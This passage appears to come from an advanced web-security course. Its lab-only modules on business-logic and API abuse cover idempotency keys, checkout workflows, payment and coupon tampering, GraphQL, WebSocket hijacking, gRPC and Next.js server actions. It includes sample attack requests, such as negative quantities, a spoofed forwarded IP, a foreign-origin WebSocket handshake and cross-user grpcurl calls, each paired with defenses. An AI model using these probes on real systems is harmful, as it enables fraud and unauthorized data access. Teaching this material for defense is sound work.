**Q:** Why do parallel requests expose a race that sequential testing misses?
**A:** Because only concurrent interleaving can place one request between another request's check and its use.

===MODULE===
TITLE: Idempotency Key Abuse and Deduplication Flaws
LEVEL: Advanced
MINUTES: 60
SUMMARY: Analyze idempotency mechanisms as deduplication maps and find flaws in key scope, persistence, and response handling.
OBJECTIVES: Test key reuse and cross-user collisions | Verify atomic persistence of key and effect | Design robust idempotency
TAKEAWAYS: Keys must be unique per logical operation and per caller | Reuse must return the original result deterministically | Concurrent same-key requests need locking
PRACTICE: Against a local payments API at <LAB_HOST>, reuse an idempotency key across two users and across two endpoints to map key scope.
SOURCES: None
---
## Core idea
Idempotency keys make retries safe by mapping a client-generated token to one authoritative operation. The mechanism is a deduplication map: on first use, the server performs the effect and stores the result; on reuse, it replays the stored result. Bugs arise when the key is scoped too broadly or too narrowly, when the mapping is not persisted atomically with the effect, or when invalid keys are accepted without validation.

The mental model is a two-part transaction. The key and the side effect must commit together; otherwise a crash between them produces either a duplicate operation or a replay with no effect. Key scope must include the caller and the operation type, so one user cannot retrieve another user's stored response and so a payment key cannot be reused for a refund. Concurrent requests with the same key need a lock or unique constraint, not just a read-then-check.

### Step-by-step method (lab only)
1. Identify where <LAB_HOST> accepts idempotency keys: header, query, or body.
2. Reuse the same key twice and compare responses and persisted effects.
3. Reuse the key from a second authenticated user to test scope.
4. Reuse the key against a different endpoint or operation type.
5. Fire parallel requests with the same key and count the effects.

### Concrete example
```http
POST /payments HTTP/1.1
Host: <LAB_HOST>
Authorization: Bearer <TOKEN_A>
Idempotency-Key: 7f3c9a21
Content-Type: application/json

{"amount":100,"currency":"USD"}
```
If TOKEN_B with the same key receives TOKEN_A's response and no new charge, the key is not scoped to the caller.

| Flaw | Test | Fix |
|---|---|---|
| Global key | Cross-user reuse | Include caller ID |
| Non-atomic store | Crash between steps | Single transaction |
| No validation | Arbitrary key values | Format and length checks |

### Bypass and defense pairs
- Bypass: concurrent same-key requests both pass the initial check. Defense: unique database constraint on the key with conflict handling.
- Bypass: key reused across endpoints. Defense: include endpoint and operation type in the storage key.

### Additional surface
Stored responses can themselves leak data: if replay returns the full original response, an attacker who guesses a key may retrieve another user's result. Scope the stored response to the authenticated caller and expire old entries. Also check whether failed operations consume keys, which can be used to poison a legitimate retry.

### Common mistakes
- Treating idempotency as a rate limit.
- Generating keys server-side from predictable request properties.
- Forgetting to hash or truncate very long keys before storage.

### Knowledge check
**Q:** Why must the key and the effect commit atomically?
**A:** Otherwise a failure between the two steps causes either a duplicate effect on retry or a replayed response for an operation that never happened.

===MODULE===
TITLE: Workflow Bypass and State Machine Abuse
LEVEL: Advanced
MINUTES: 60
SUMMARY: Learn to bypass multi-step workflows by calling later states directly, replaying transitions, or forging state parameters.
OBJECTIVES: Map workflow states and transitions | Test direct and out-of-order calls | Enforce transitions server-side
TAKEAWAYS: Workflows are graphs with guarded edges | Entry checks do not protect later transitions | Client-supplied state is untrusted
PRACTICE: In a local checkout lab at <LAB_HOST>, call the final confirmation endpoint directly and observe whether earlier required steps are enforced.
SOURCES: None
---
## Core idea
Multi-step workflows such as checkout, onboarding, and approval are state machines. Each transition should be authorized and validated independently. Bugs appear when only the first step is guarded, when transitions are inferred from a client-supplied state field, or when later steps assume earlier steps happened. The mental model is a directed graph: security must be attached to edges, not just to the entry node. If a node is reachable through a direct request, its prerequisites must be revalidated.

Common variants include skipping payment to reach fulfillment, replaying an earlier step to reset state, moving backward to re-trigger a side effect, and forging a state parameter to make the server believe a prerequisite was completed. Workflows implemented across multiple services are especially fragile because each service may trust a message from another without verifying the state.

### Step-by-step method (lab only)
1. Map the states and transitions of the workflow at <LAB_HOST> by walking it normally.
2. Record every endpoint and the parameters that appear to encode state.
3. Call later endpoints directly with a valid object identifier.
4. Replay earlier requests after the workflow advanced.
5. Tamper state values and observe whether unauthorized transitions are accepted.

### Concrete example
```http
POST /checkout/confirm HTTP/1.1
Host: <LAB_HOST>
Content-Type: application/json

{"orderId":"ORD-1042","step":"complete"}
```
If the server trusts `step` rather than its own persisted state, the payment step is skipped. A robust implementation reads the only valid next state from the server-side record.

| Attack | Assumption broken |
|---|---|
| Direct later step | Prerequisite was completed |
| Replay earlier step | Transition is one-way |
| Forge state field | Server owns state |

### Bypass and defense pairs
- Bypass: changing a hidden form field to jump states. Defense: derive state solely from server storage.
- Bypass: calling the webhook that advances state directly. Defense: authenticate internal transitions and validate signatures.

### Additional surface
Parallel transitions deserve attention too: two simultaneous requests may both believe they own the current state and apply conflicting updates. Use optimistic concurrency control with a version column so only one transition succeeds. Also verify that canceled or expired objects cannot be revived by late requests.

### Common mistakes
- Relying on the order of browser navigation.
- Assuming an internal endpoint is unreachable from the internet.
- Validating prerequisites only in the UI.

### Knowledge check
**Q:** Why is a client-supplied state field unsafe even if it is signed?
**A:** Because signing proves integrity, not authorization; a user may legitimately possess a signed value for a state they are not allowed to transition to.

===MODULE===
TITLE: Payment and Quantity Abuse Patterns
LEVEL: Advanced
MINUTES: 75
SUMMARY: Study economic logic abuse through negative values, fractional units, currency mismatch, price tampering, and rounding errors.
OBJECTIVES: Test monetary fields for client-controlled pricing | Detect unit and currency confusion | Recompute totals authoritatively
TAKEAWAYS: The server must derive price from catalog data | Negative and fractional values are common primitives | Integer minor units avoid float errors
PRACTICE: In a local store at <LAB_HOST>, submit a harmless negative quantity and a mismatched currency to see which values the server trusts.
SOURCES: None
---
## Core idea
Payment logic is a calculation over untrusted inputs. If any input that affects the total comes from the client, the attacker can rewrite the economics of the transaction. Typical primitives are negative quantities, zero or negative prices, fractional values that exploit rounding, currency mismatches across services, repeated coupons, and tampered item identifiers. The mental model is a chain of derived values: catalog price -> discount -> tax -> total. Each step must be recomputed from authoritative data, never from a client-provided intermediate result.

Floating-point money is a subtle source of bugs. A value like 0.1 cannot be represented exactly, so repeated additions can round in the attacker's favor. Storing amounts as integer minor units, such as cents, removes this class. Unit confusion is equally dangerous: one service may treat an amount as cents while another treats it as dollars, creating a factor-of-100 discrepancy.

### Step-by-step method (lab only)
1. Capture a complete purchase request at <LAB_HOST> and list every field affecting the total.
2. Test negative, zero, fractional, and very large quantities with harmless items.
3. Test price, subtotal, and total fields supplied by the client.
4. Test currency changes and coupon stacking.
5. Compare the persisted charge with the server-side recomputation.

### Concrete example
```json
{
  "itemId": "SKU1",
  "quantity": -5,
  "unitPrice": 0.01,
  "currency": "USD",
  "coupon": ["SAVE10", "SAVE10"]
}
```
If `unitPrice` is trusted, the attacker controls the price. If negative quantity is accepted, the total may become a credit.

| Primitive | Effect | Defense |
|---|---|---|
| Negative quantity | Credit or refund | Range validation |
| Client price | Arbitrary total | Catalog lookup |
| Currency mismatch | Unit confusion | Single currency per order |
| Coupon stacking | Unbounded discount | One coupon, atomic use |

### Bypass and defense pairs
- Bypass: fractional quantity that rounds down at each line item. Defense: integer quantities and integer minor units.
- Bypass: swapping currency after total calculation. Defense: bind currency to the order at creation.

### Additional surface
Refund and credit paths deserve equal scrutiny. A negative amount in a purchase may be rejected while the same amount in a refund endpoint is accepted, producing the same economic effect. Test every endpoint that changes a balance, not just checkout.

### Common mistakes
- Trusting a recomputed total that is returned but not persisted.
- Allowing the client to choose the currency at the final step.
- Ignoring refunds, credits, and loyalty redemption paths.

### Knowledge check
**Q:** Why are integer minor units safer than floating-point for money?
**A:** Because they avoid binary rounding errors that accumulate and can be exploited through many small fractional transactions.

===MODULE===
TITLE: GraphQL Batching and Alias Abuse
LEVEL: Advanced
MINUTES: 60
SUMMARY: Examine how batched operations and aliases amplify cost, bypass rate limits, and confuse authorization checks.
OBJECTIVES: Test batched and aliased queries safely | Measure complexity amplification | Apply per-operation limits
TAKEAWAYS: Batching multiplies cost while many limiters count requests | Aliases can evade field-name checks | GET-based queries enable cross-origin data theft
PRACTICE: Against a local GraphQL endpoint at <LAB_HOST>, send a small harmless batch of aliases and compare it to separate requests.
SOURCES: None
---
## Core idea
GraphQL lets clients send multiple operations in one request and rename fields with aliases. Both features are legitimate but they change the security accounting. A rate limiter that counts HTTP requests sees one request where the server executes hundreds of operations. A field-level authorization filter that matches response keys can be evaded by aliasing a sensitive field to an innocuous name. Deeply nested batched queries can amplify server cost dramatically.

The mental model is a multiplier: the cost of a request is the product of query complexity and batch size. Defenses must measure that product, not the request count. GET-based queries add a cross-origin angle because a URL can be embedded in an image or script tag, and a permissive CORS policy can make responses readable. Introspection and batching together can also accelerate schema discovery.

### Step-by-step method (lab only)
1. Confirm that <LAB_HOST> accepts batched arrays of operations.
2. Send a small harmless batch and measure the response time and result count.
3. Test aliases on a sensitive field to see whether any authorization depends on response key names.
4. Measure depth and complexity limits with a moderately nested query.
5. Test whether rate limits apply per request or per operation.

### Concrete example
```json
[
  {"query":"{ a: user(id:\"A\") { email } }"},
  {"query":"{ b: user(id:\"B\") { email } }"}
]
```
If authorization checks the alias name rather than the underlying field, the second operation may slip through. A depth probe:
```graphql
{ user { friends { friends { friends { email } } } } }
```

| Feature | Abuse | Control |
|---|---|---|
| Batching | Rate-limit bypass | Count operations |
| Aliases | Field-name filter bypass | Check field definitions |
| Nesting | Cost amplification | Depth and complexity limits |

### Bypass and defense pairs
- Bypass: splitting one expensive query across many batched entries. Defense: sum complexity across the whole batch.
- Bypass: GET query embedded cross-origin. Defense: require POST for authenticated operations and validate content type.

### Additional surface
Subscriptions and file uploads introduce separate channels that may be excluded from query-level limits. Persisted queries are a strong control because the server executes only preapproved documents, eliminating arbitrary structure at runtime.

### Common mistakes
- Counting HTTP requests instead of operations.
- Authorizing on alias names.
- Forgetting complexity limits on mutation fields.

### Knowledge check
**Q:** Why does batching defeat a request-count rate limiter?
**A:** Because one HTTP request can contain many operations, so the limiter undercounts the work the server performs.

===MODULE===
TITLE: Coupon, Referral, and Loyalty Abuse
LEVEL: Advanced
MINUTES: 60
SUMMARY: Study promotional systems as financial state machines vulnerable to reuse, stacking, self-referral, and eligibility errors.
OBJECTIVES: Test single-use enforcement under concurrency | Detect stacking and eligibility gaps | Design atomic promotion redemption
TAKEAWAYS: Promotions change balances and need atomic enforcement | Concurrency defeats naive single-use flags | Eligibility must be rechecked at redemption
PRACTICE: In a local loyalty lab at <LAB_HOST>, redeem a single-use coupon twice in parallel and count successful applications.
SOURCES: None
---
## Core idea
Coupons, referrals, and loyalty points are financial state transitions disguised as growth features. They fail for the same reasons payment logic fails: checks and mutations are split, eligibility is evaluated at the wrong time, and multiple discounts can stack. The mental model is a ledger. Every promotion writes to a balance or an order total, and that write must be atomic, idempotent, and constrained by server-side policy.

Common bugs include reusing a code because `used=false` is read before it is written, applying two coupons when the UI only allows one, self-referral creating infinite signup credit, using a code on ineligible items, and replaying a redemption request to add points repeatedly. Expiry times evaluated in the client's time zone create additional edge cases.

### Step-by-step method (lab only)
1. Enumerate promotion entry points at <LAB_HOST>: checkout fields, referral links, and point-redemption endpoints.
2. Test a single-use code twice sequentially and then in parallel.
3. Test two codes together to see whether stacking is blocked server-side.
4. Test self-referral and referral of an existing account.
5. Test eligibility by applying a code to an excluded item and after expiry.

### Concrete example
```http
POST /checkout/apply-coupon HTTP/1.1
Host: <LAB_HOST>
Content-Type: application/json

{"code":"SINGLE10","orderId":"ORD-1042"}
```
Two parallel requests may both pass the unused check. A referral probe:
```json
{"referrer":"<OWN_ACCOUNT>","referee":"<OWN_ACCOUNT>"}
```

| Abuse | Server error | Fix |
|---|---|---|
| Code reuse | Read then write | Atomic claim |
| Stacking | No global constraint | One coupon per order |
| Self-referral | No identity check | Distinct accounts |
| Expiry bypass | Client time | Server clock |

### Bypass and defense pairs
- Bypass: parallel redemption. Defense: unique constraint on code use with a transaction.
- Bypass: applying a coupon then changing the cart. Defense: revalidate eligibility at checkout commit.

### Additional surface
Loyalty balances can be manipulated through replayed credit requests or through rounding when points convert to currency. Treat point issuance as a privileged operation with an audit trail, and verify that refunds reverse both the payment and the points.

### Common mistakes
- Trusting the UI to prevent stacking.
- Using a boolean flag without a database constraint.
- Assuming referral codes are low value and not worth protecting.

### Knowledge check
**Q:** Why does a unique constraint on code use stop concurrent redemption?
**A:** Because the database rejects the second insert or update that marks the same code used, forcing one request to fail.

===MODULE===
TITLE: Rate Limiting and Resource Exhaustion Logic
LEVEL: Advanced
MINUTES: 60
SUMMARY: Learn how limiters key on imperfect identity and cost signals, and how expensive endpoints turn small requests into large loads.
OBJECTIVES: Identify the limiter's identity key | Bypass header-based and per-endpoint limits | Measure true request cost
TAKEAWAYS: Limiters count a proxy for identity and cost | Expensive endpoints defeat request-count limits | Compression and nesting amplify work
PRACTICE: Against a local API at <LAB_HOST>, vary client-IP headers and measure how the rate limit responds in your own lab.
SOURCES: None
---
## Core idea
Rate limiting is a control over identity and cost, but both are usually approximated. The limiter may key on a client-supplied IP header, a session cookie, or an API key, and may count requests rather than work. If the identity key can be changed, the attacker gets a fresh bucket. If the cost metric ignores expensive endpoints, a few requests can consume enormous resources. The mental model is two divergences: attacker-controlled identity versus real identity, and request count versus actual work.

Common bypasses include spoofing `X-Forwarded-For` when the edge does not overwrite it, rotating API keys or accounts, using different paths that share a handler, and exploiting batching. Resource exhaustion comes from deep query nesting, large payloads, decompression bombs, and catastrophic regular expressions. Defenses should key on authenticated identity where possible, normalize forwarded headers at the edge, and apply cost-based limits using query complexity or payload size.

### Step-by-step method (lab only)
1. Determine the limiter's key at <LAB_HOST> by observing which changes reset the bucket.
2. Test client-IP headers, cookies, and API keys independently.
3. Test equivalent endpoints and content types for separate buckets.
4. Measure server time for small versus large payloads and deep versus shallow queries.
5. Verify that the limiter accounts for batch size and nesting depth.

### Concrete example
```http
POST /api/search HTTP/1.1
Host: <LAB_HOST>
X-Forwarded-For: 203.0.113.7
Content-Type: application/json

{"query":"a".repeat(100000)}
```
If the edge trusts the forwarded header, each value creates a new bucket. A deeply nested GraphQL query similarly inflates cost while counting as one request.

| Signal | Weakness | Stronger approach |
|---|---|---|
| Client IP header | Spoofable | Edge-overwritten value |
| Request count | Ignores cost | Complexity score |
| Per-endpoint | Shared handlers | Handler-level limit |

### Bypass and defense pairs
- Bypass: rotating forwarded-for values. Defense: overwrite forwarded headers at the trusted edge and discard client copies.
- Bypass: decompression bomb inside a small compressed body. Defense: limit decompressed size and processing time.

### Additional surface
Distributed sources defeat naive per-IP limits, so pair them with global budgets on expensive operations. Also ensure that rejections are cheap: a limiter that performs full parsing before rejecting offers little protection.

### Common mistakes
- Trusting forwarded headers without sanitizing them.
- Applying limits only to login and forgetting expensive read endpoints.
- Ignoring CPU cost in favor of connection counts.

### Knowledge check
**Q:** Why is a complexity-based limit stronger than a request-count limit for GraphQL?
**A:** Because complexity measures the work a query requests, including nesting and batching, rather than the number of HTTP requests.
===MODULE===
TITLE: Next.js and React Server Components Security
LEVEL: Advanced
MINUTES: 75
SUMMARY: Analyze the Flight serialization boundary and server actions as an RPC surface with its own authorization needs.
OBJECTIVES: Inspect RSC payloads and action identifiers | Test server action authorization and CSRF | Harden cache and action boundaries
TAKEAWAYS: RSC payloads are serialized instructions | Server actions are RPC endpoints requiring authz | Cache keys must include action-relevant state
PRACTICE: In a local Next.js app at <LAB_HOST>, inspect a server action request and replay it with modified arguments using an owned account.
SOURCES: None
---
## Core idea
React Server Components move rendering to the server and send a serialized Flight payload to the client. Server actions are RPC-like endpoints addressed by generated identifiers. The security boundary is the serialization format: every reference in a Flight payload is an instruction the client or server will interpret. Bugs in this stack include missing authorization on server actions, reliance on CSRF protections that do not apply to the action transport, prototype manipulation during deserialization, and cache keys that ignore personalized state.

The mental model is an RPC framework embedded in a page. A server action is a function reachable by an identifier that may be discoverable from the client bundle. If authorization is performed in the component that renders a button but not inside the action, calling the action directly bypasses it. Because actions are invoked with POST requests, origin and content-type checks matter, and framework versions have had significant vulnerabilities around deserialization and routing.

### Step-by-step method (lab only)
1. Identify the framework version and router mode at <LAB_HOST> from headers and bundles.
2. Inspect network requests for `text/x-component` responses and `Next-Action`-style headers.
3. Extract action identifiers from the client bundle and call them directly with your owned account.
4. Test origin and content-type validation by replaying an action from an owned second origin.
5. Test whether cached RSC responses vary by user, cookie, and request headers.

### Concrete example
```http
POST / HTTP/1.1
Host: <LAB_HOST>
Next-Action: <ACTION_ID>
Content-Type: multipart/form-data; boundary=...
```
A tampered argument:
```json
["<ORDER_ID>", "<ROLE_ADMIN>"]
```
If the action trusts the second argument, privilege escalation occurs.

| Surface | Risk | Control |
|---|---|---|
| Action ID | Direct invocation | Authz inside action |
| RSC payload | Deserialization bugs | Patch framework |
| Cache key | Cross-user HTML | Vary by identity |

### Bypass and defense pairs
- Bypass: calling an action without the UI that normally guards it. Defense: authorize inside every action using the session.
- Bypass: cross-origin action invocation. Defense: enforce origin and content-type checks at the framework or edge.

### Additional surface
Prototype manipulation in serialized payloads can affect client hydration as well as server processing. Treat deserialized objects as untrusted and avoid spreading them into application configuration. Also verify that personalized data is never embedded in a publicly cacheable RSC response.

### Common mistakes
- Assuming the framework handles authorization automatically.
- Reading action identifiers as secrets; they are often public.
- Ignoring cache behavior for streamed responses.

### Knowledge check
**Q:** Why must authorization live inside a server action rather than in the component that renders it?
**A:** Because the action is directly callable by identifier; the rendering component is not part of the request path when an attacker invokes it.

===MODULE===
TITLE: Serverless and Edge Runtime Security Quirks
LEVEL: Advanced
MINUTES: 60
SUMMARY: Study how recycled execution contexts, embedded configuration, and edge/origin differences change web security assumptions.
OBJECTIVES: Detect state leakage across invocations | Audit bundles and environment exposure | Harden cache and header handling
TAKEAWAYS: Module-scope state survives warm invocations | Bundles can leak secrets | Edge and origin see different request data
PRACTICE: In a local serverless function at <LAB_HOST>, store a marker in module scope and observe whether a later invocation sees it.
SOURCES: None
---
## Core idea
Serverless and edge runtimes recycle execution contexts. A function's module-scope variables may persist across warm invocations, so data written by one request can be read by another. That turns a seemingly harmless cache or global into a cross-user state leak. Other quirks include secrets accidentally bundled into client code, environment variables visible to any function, and differences between the edge proxy and the origin in how headers and client IPs are presented.

The mental model is a shared, recycled process with an ambiguous lifetime. Anything stored outside the request object may outlive the request. Incremental static regeneration and edge caches add another layer: a generated page may be stored and served to users who should not see its content if the cache key omits identity. Configuration mistakes such as trusting a client-supplied forwarded-for header are amplified when the edge is expected to overwrite it.

### Step-by-step method (lab only)
1. Map functions and routes at <LAB_HOST> and note which run at the edge versus the origin.
2. Test module-scope state by writing a harmless marker in one invocation and reading it in another.
3. Inspect client bundles for secrets, internal URLs, and environment values.
4. Test cache keys for personalized pages across two owned accounts.
5. Compare the request as seen at the edge and at the origin using a debug echo endpoint.

### Concrete example
```js
let cachedIdentity; // module scope, persists on warm invocations
export default async function handler(req) {
  if (!cachedIdentity) cachedIdentity = req.headers['x-identity'];
  return Response.json({ cachedIdentity });
}
```
The second caller receives the first caller's identity.

| Quirk | Risk | Mitigation |
|---|---|---|
| Warm globals | Cross-request leak | Per-request state only |
| Bundled secrets | Credential exposure | Server-only env |
| ISR cache | Cross-user content | Identity in key |

### Bypass and defense pairs
- Bypass: reading a secret from a public bundle. Defense: use server-only environment variables and verify bundles before deployment.
- Bypass: stale personalized page from cache. Defense: include identity in the cache key or disable caching for authenticated routes.

### Additional surface
Cold starts change timing, which can break security tests that rely on consistent latency. They also mean a global cache may be empty on one invocation and populated on the next, so test repeatedly. Verify that internal function URLs are not directly reachable without passing through the edge.

### Common mistakes
- Assuming each invocation gets a fresh process.
- Trusting edge-overwritten headers without verifying they are actually overwritten.
- Logging full request bodies containing secrets.

### Knowledge check
**Q:** Why can a module-scope variable leak data between users?
**A:** Because warm invocations reuse the same execution context, so state from an earlier request remains visible.

===MODULE===
TITLE: WebSocket Security and Cross-Site Hijacking
LEVEL: Advanced
MINUTES: 60
SUMMARY: Learn how the WebSocket upgrade bypasses same-origin policy and why authorization must be enforced per message.
OBJECTIVES: Validate upgrade origin and authentication | Test cross-site WebSocket hijacking in a lab | Enforce message-level authorization
TAKEAWAYS: Origin is the only built-in cross-origin signal | Connection-time auth is insufficient | Tokens in URLs leak through logs
PRACTICE: Against a local WebSocket service at <LAB_HOST>, connect from an owned foreign origin and observe whether the handshake is accepted.
SOURCES: None
---
## Core idea
A WebSocket begins with an HTTP upgrade, after which the connection is not governed by same-origin policy. The only built-in signal about the initiating page is the `Origin` header, so failing to validate it enables cross-site WebSocket hijacking. Authentication performed only at connection setup is also weak: a single long-lived socket may carry messages for many resources, and each message needs its own authorization decision. Tokens placed in the URL are particularly risky because they appear in logs, referrers, and browser history.

The mental model is a persistent authenticated channel. A browser page can open it silently, so consent is implicit. Once open, the attacker-controlled page can send arbitrary frames and read responses. If the server treats the socket's initial identity as blanket authorization, the attacker acts with the victim's privileges for the socket's lifetime.

### Step-by-step method (lab only)
1. Capture the upgrade request at <LAB_HOST> and record authentication and origin headers.
2. Open the socket from an owned foreign origin and check whether the handshake succeeds.
3. Test origin validation with lookalike domains and missing origins.
4. Test whether a token is passed in the query string and whether it leaks in logs.
5. Send messages referencing another user's object IDs and observe authorization.

### Concrete example
```http
GET /ws?token=<TOKEN_A> HTTP/1.1
Host: <LAB_HOST>
Upgrade: websocket
Connection: Upgrade
Origin: https://evil.example
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
```
If the server ignores `Origin` and trusts the token in the URL, the attacker's page can drive the victim's socket.

| Control | Weak | Strong |
|---|---|---|
| Origin check | Substring or absent | Exact allowlist |
| Auth location | Query string | Header or cookie |
| Message authz | Connection-time only | Per message |

### Bypass and defense pairs
- Bypass: origin header with a lookalike domain. Defense: exact comparison against an allowlist.
- Bypass: sending a message with a foreign object ID. Defense: authorize each message against the session's identity.

### Additional surface
Subprotocol negotiation and compression extensions can introduce parser differences between proxy and application. Verify that the proxy forwards the same frames the application sees, and apply message size and rate limits to prevent memory exhaustion.

### Common mistakes
- Assuming same-origin policy applies after upgrade.
- Treating a socket as inherently trusted once authenticated.
- Using predictable tokens in URLs.

### Knowledge check
**Q:** Why is connection-time authorization insufficient for WebSockets?
**A:** Because one socket can carry many requests for different resources; each message must be authorized against the current caller and object.

===MODULE===
TITLE: gRPC and Metadata Trust Boundaries
LEVEL: Advanced
MINUTES: 60
SUMMARY: Study authorization and parsing issues in HTTP/2-based gRPC services and their REST transcoding gateways.
OBJECTIVES: Enumerate services and methods in a lab | Test metadata-based authentication | Compare gateway and native authorization
TAKEAWAYS: Binary framing hides semantics from text-based controls | Metadata is attacker-controlled input | Per-method authorization is required
PRACTICE: In a local gRPC lab at <LAB_HOST>, use reflection to list services and call a method with modified metadata from an owned account.
SOURCES: None
---
## Core idea
gRPC transports protobuf messages over HTTP/2 and carries authentication in metadata headers. Because payloads are binary, text-oriented proxies and WAFs may have little visibility into method names and arguments. Authorization must therefore be enforced inside the service per method, and metadata must be treated as untrusted input. Reflection, if exposed, makes service enumeration trivial, while REST-to-gRPC transcoding can create two paths with different authorization rules.

The mental model is two doors into one room. A REST gateway may enforce a policy that the native gRPC endpoint does not, or vice versa. Streaming methods add complexity because state can evolve across many messages, and a check performed on the first message may not hold later. Message size limits and flow-control settings are also security-relevant because they bound resource consumption.

### Step-by-step method (lab only)
1. Check whether server reflection is enabled at <LAB_HOST> and list services in your lab.
2. Identify the metadata key used for authentication and test missing, duplicated, and forged values.
3. Compare the same operation through the REST gateway and native gRPC.
4. Test unary and streaming variants of a method for inconsistent authorization.
5. Test oversized messages and streaming duration limits.

### Concrete example
```text
grpcurl -H "authorization: Bearer <TOKEN_B>" <LAB_HOST>:443 list
grpcurl -H "authorization: Bearer <TOKEN_B>" -d '{"id":"1042"}' \
  <LAB_HOST>:443 pkg.User/GetProfile
```
If TOKEN_B receives user 1042's profile, the method lacks object-level authorization.

| Surface | Risk | Control |
|---|---|---|
| Reflection | Service enumeration | Disable in production |
| Metadata | Auth spoofing | Verify signed tokens |
| Transcoding | Policy divergence | Shared auth layer |

### Bypass and defense pairs
- Bypass: calling the native method directly when the gateway enforces auth. Defense: enforce authorization in the service, not only the gateway.
- Bypass: duplicate metadata keys that one layer deduplicates differently. Defense: reject duplicate auth metadata.

### Additional surface
HTTP/2 header compression and flow control interact with gRPC framing; apply the same desync discipline as for HTTP/2 generally. Ensure that TLS and ALPN configuration does not allow an unexpected protocol downgrade that routes around the service's controls.

### Common mistakes
- Assuming binary protocols are inherently safer.
- Leaving reflection enabled in production.
- Authorizing only at the transcoding gateway.

### Knowledge check
**Q:** Why can a REST gateway's authorization be bypassed through native gRPC?
**A:** Because both are separate entry paths to the same service; if enforcement lives only in the gateway, direct gRPC calls skip it.

===MODULE===
TITLE: GraphQL Federation and Subgraph Authorization
LEVEL: Advanced
MINUTES: 75
SUMMARY: Examine how query planning and entity resolution can break authorization across federated subgraphs.
OBJECTIVES: Map gateway and subgraph trust boundaries | Test entity resolution for cross-tenant access | Enforce policy in every subgraph
TAKEAWAYS: Authorization must travel with the query plan | Subgraphs must enforce policy independently | Entity resolvers are a cross-service join primitive
PRACTICE: In a local federated lab at <LAB_HOST>, call a subgraph directly and then through the gateway to compare authorization behavior.
SOURCES: None
---
## Core idea
GraphQL federation splits one schema across subgraphs behind a gateway that plans and executes queries. The convenience hides a trust boundary: the gateway may enforce authorization while subgraphs assume requests are already trusted. If a subgraph is directly reachable, its policy disappears. Even through the gateway, entity resolution lets a query join objects across services using keys, which can become a cross-tenant data access primitive when keys are attacker-controlled.

The mental model is a distributed query plan with policy attached at the edges. Every hop must carry and revalidate the caller's identity. Directives that look declarative may be enforced only at the gateway, leaving subgraphs to return unauthorized fields. Query planning also amplifies cost: a single query can fan out to many subgraph calls, overwhelming a backend that the gateway's limits did not account for.

### Step-by-step method (lab only)
1. Map the gateway, subgraphs, and shared entities at <LAB_HOST> from schema and documentation in your lab.
2. Attempt direct calls to each subgraph, bypassing the gateway.
3. Query a sensitive field through aliases and fragments to test field-level policy.
4. Use `_entities` with representations referencing another tenant's identifiers.
5. Measure subgraph call counts for a deeply nested query.

### Concrete example
```json
{"query":"{ _entities(representations:[{__typename:\"User\",id:\"1042\"}]) { ... on User { email } } }"}
```
If the user subgraph returns the email without checking the caller, federation has become a cross-tenant join.

| Boundary | Failure | Defense |
|---|---|---|
| Gateway only | Direct subgraph access | Auth in every subgraph |
| Entity key | Cross-tenant join | Validate ownership |
| Query plan | Fan-out amplification | Subgraph-level limits |

### Bypass and defense pairs
- Bypass: direct subgraph request with gateway-only auth. Defense: network-isolate subgraphs and authenticate at each one.
- Bypass: representation with a foreign tenant key. Defense: verify entity ownership before resolving.

### Additional surface
Shared fields marked as shareable can resolve in multiple subgraphs with different implementations, so one may enforce a policy the other omits. Test every resolver path for the same field. Also verify that JWT claims or identity headers are signed when passed from gateway to subgraph.

### Common mistakes
- Trusting internal network position as authorization.
- Assuming directives are enforced everywhere.
- Ignoring cost amplification across subgraph calls.

### Knowledge check
**Q:** Why is entity resolution a cross-tenant risk?
**A:** Because it lets a caller supply keys that join data in another service; without ownership checks the gateway's policy is bypassed through the join.

===MODULE===
TITLE: SSR Hydration State and Server Action Abuse
LEVEL: Advanced
MINUTES: 60
SUMMARY: Study how server-rendered HTML carries serialized application state and how that state can be inspected or manipulated.
OBJECTIVES: Audit embedded state for sensitive data | Test server action argument tampering | Prevent cross-user cached HTML
TAKEAWAYS: Hydration data is visible to every client | Serialized props are inputs, not trusted state | Personalized HTML must not be publicly cached
PRACTICE: On a local SSR page at <LAB_HOST>, inspect embedded JSON state with a test account and search for sensitive values.
SOURCES: None
---
## Core idea
Server-side rendering improves performance by embedding initial state into HTML so the client can hydrate. That state is a serialized program input: anything placed there is visible to the browser and often mutable before hydration. Bugs include leaking secrets or internal objects into props, trusting hydrated values as authoritative, and caching personalized HTML under a public key. Server actions compound this by accepting arguments that the client can alter after render.

The mental model is a snapshot of server data shipped to the client. The snapshot is evidence of what the server once knew, not proof of what it should now allow. Hydration mismatches, where client and server render different outputs, can sometimes be used to desynchronize state or trigger unexpected code paths. Cache configuration determines who else receives the snapshot.

### Step-by-step method (lab only)
1. View the page source at <LAB_HOST> and locate embedded JSON scripts used for hydration.
2. Search the serialized state for tokens, internal identifiers, and feature flags.
3. Modify a harmless prop in the browser and observe whether the client trusts it.
4. Replay a server action with altered arguments using your owned account.
5. Fetch the same URL in a second account to test whether cached HTML leaks personalized data.

### Concrete example
```html
<script id="__NEXT_DATA__" type="application/json">
{"props":{"user":{"id":"1042","role":"admin"},"csrf":"..."}}
</script>
```
If role is used for client-side decisions that the server also trusts, escalation follows.

| Surface | Risk | Control |
|---|---|---|
| Serialized props | Data exposure | Allowlist fields |
| Hydration mismatch | State desync | Deterministic render |
| Shared cache | Cross-user HTML | Identity in key |

### Bypass and defense pairs
- Bypass: altering a prop that the server later trusts. Defense: revalidate every value server-side.
- Bypass: public cache serving personalized HTML. Defense: mark authenticated routes private.

### Additional surface
Error pages and streaming boundaries can leak different state than the main document. Check partial responses and suspended streams as well. Verify that feature flags intended for internal users are not shipped to everyone, since they reveal roadmap and enable probing of hidden endpoints.

### Common mistakes
- Assuming server rendering means data stays on the server.
- Trusting client-side role checks that mirror server state.
- Ignoring cache headers on HTML responses.

### Knowledge check
**Q:** Why are serialized props an input rather than trusted state?
**A:** Because the browser receives them as text and can modify them; only server-side validation makes them trustworthy.

===MODULE===
TITLE: Building Regression Tests for Web Security Bugs
LEVEL: Advanced
MINUTES: 45
SUMMARY: Convert web vulnerability findings into durable automated tests that fail on the vulnerable code and pass on the fix.
OBJECTIVES: Reduce a finding to a testable invariant | Choose the right test layer | Integrate security tests into CI
TAKEAWAYS: A regression test encodes a violated invariant | It must fail before and pass after the fix | Both positive and negative cases are needed
PRACTICE: In a local app at <LAB_HOST>, write a test asserting that conflicting length headers are rejected, run it before and after a fix.
SOURCES: None
---
## Core idea
